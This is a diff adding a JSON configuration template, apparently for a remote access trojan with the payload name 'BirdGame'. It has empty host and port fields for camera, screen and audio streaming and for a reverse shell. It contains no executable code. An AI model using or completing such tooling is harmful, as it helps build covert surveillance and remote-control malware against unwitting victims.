@@ -1,0 +1,21 @@
+{
+    "PayloadConfig" : {
+        "name" : "BirdGame",
+        "lhost" : "",
+        "lport" :{
+            "CameraStreamingPort" : "",
+            "ScreenStreamingPort" : "",
+            "ReverseShellPort" : "",
+            "AudioStreamingPort" : ""
+        }
+    },
+    "ServerConfig" : {
+        "lhost" : "",
+        "lport" : {
+            "CameraStreamingPort" : "",
+            "ScreenStreamingPort" : "",
+            "ReverseShellPort" : "",
+            "AudioStreamingPort" : ""
+        }
+    }
+}
